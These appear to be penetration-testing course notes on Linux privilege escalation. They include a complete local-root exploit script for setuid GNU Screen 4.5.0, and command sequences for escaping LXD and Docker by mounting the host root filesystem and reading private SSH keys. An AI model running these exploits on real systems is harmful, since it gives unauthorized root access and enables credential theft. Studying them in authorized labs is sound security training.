## Vulnerable Services
* Many running services may be exploitable 
### Example
### Screen version 4.5.0
```shell
screen -v 
```
#### Script:
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```
## Cron Job Abuse
* Cron jobs can also be set run on time.
* `Crontab` command can create a cron file. This will be created by the cron daemon on the schedule specified.   
### Cronjob Entry 
| minutes | hours  | days | months | weeks | Meaning        |
| ------- | ------ | ---- | ------ | ----- | -------------- |
| `0`     | `*/12` | `*`  | `*`    | `*`   | Every 12 Hours |
 
* root crontab is only editable by the root user or a user with full sudo priviliges. 
* If you find world writable scripts that run as root in a crontab, you may be able to use these.
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
* use [pspy](https://github.com/DominicBreuker/pspy) to see if there is a cronjob running
```shell
./pspy64 -pf -i 1000
```
## Containers
* Operate at the OS system level and in virtual machines at the hardware level.
### LXC
* Linux Containers (LXC) is an operating system-level virtualisation technique
* Very popular due to their ease of user.
* By default LXC consume fewer resources than a virtual machine have a standard interface.
### LXD
* Linux Daemon is similar in some aspects but it is designed to contain a complete operating system. 
* Not an application contain but as such a system container.
### Exploit
* First check if we are in one of their groups
```shell
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
* We can either create our own container or use an existing container. 
```shell
cd ContainerImages
ls
```
Templates often do not have passwords
```shell
lxc image import <template_name> --alias ubuntutemp
```
Verify import
```shell
lxc image list
```
Initiate the image and configure it by specifying the `security.privileged` flag. This flag disables all isolation
```shell
 lxc init ubuntutemp privesc -c security.privileged=true
```
Specify the root path for the container
```shell
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Start the container
```shell
lxc start privesc
```
```shell
 lxc exec privesc /bin/bash
```
```shell
ls -l /mnt/root
```
## Docker
* Open-source tool that provides a portable and consistent runtime enviromenet for software applications.
### Docker Architecture
#### Docker Daemon
* Also known as the docker server.
* Functions:
	* running Docker containers
	* Interacting with docker containers 
	* Managing Docker containers on the host system. 
##### Managing Docker Containers
* Core containerisation functionality
* Coordinates creation, execution and monitoring of Docker containers. 
	* This ensures all containers operate independently with their own file system.
##### Network and Storage 
* Facilitates container networking by creating virtual networks and managing interfaces. 
* Allows containers to communicate with each other and the outside world through network ports, IP address and DNS.
#### Docker Clients 
* Commands are issued through the Docker Client. 
* These communicate through the Docker Daemon through RESTful API or a UNIX socket. 
* Primary means of interacting with Docker. 
* Have the ability to create, start, stop and manage containers. 
##### Docker Desktop
* Provides a user-friendly GUI that simplifies the management of containers and their components. 
* It also support Kubernetes. 
#### Docker Images
* Blueprint or a template for creating containers
* encapsulates everything needed to run an application, including the applications code and dependencies. 
* A docker container is a instance of a docker image. 
* Images are immutable and `read-only` while containers are mutable and `can be modified`.
### Docker Priv Esc
#### Docker Shared Directories
* Shared directories (mounts) can bridge the gap between the host system and the containers filesystem.
* Useful for persisting data, sharing code and facilitating collaboration between environments  
* Shared directories can be mounted as read-only, modification in the container wont affect the host system. 

Look for non-standard docker libraries
```shell
cd /hostsystem/home/cry0l1t3
ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```
#### Docker Sockets
* Special file that allows us and processes to communicate with the docker daemon. 
* Access to docker sockets is typically restricted to specific users or user groups. 
* Exposing a docker socket over a network interface allows remote management. 
* The configuration files can contain very useful information that we can use to escape the docker container. 
```shell
ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Use the [docker](https://master.dockerproject.org/linux/x86_64/docker) to interact with the socket and enumerate what docker contains are running. 
```shell
wget https://<ip>/docker -O docker
chmod +x docker
ls -l
```
```shell
/tmp/docker -H unix:///app/docker.sock ps
```
Create our own Docker Container than maps the host roots directory to the hostsystem. This gives us full access to the host system. 
```shell
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```
```shell
/tmp/docker -H unix:///app/docker.sock ps
```
Login to the new privileged Docker container
```shell
/tmp/docker -H unix:///app/docker.sock exec -it <container id> /bin/bash
```
Attempt to grab ssh keys or enumerate etc...
```shell
cat /hostsystem/root/.ssh/id_rsa
```
##### Is Docker Socket Writeable?
```shell
docker image ls
```
```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <repositry name> chroot /mnt bash
```
```shell
ls -l
```

#### Docker Group
```shell
id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
Check if docker has a SUID, or if we are in the `sudoers` file to run Docker as root. 

See what images are running:
```shell
docker image ls
```
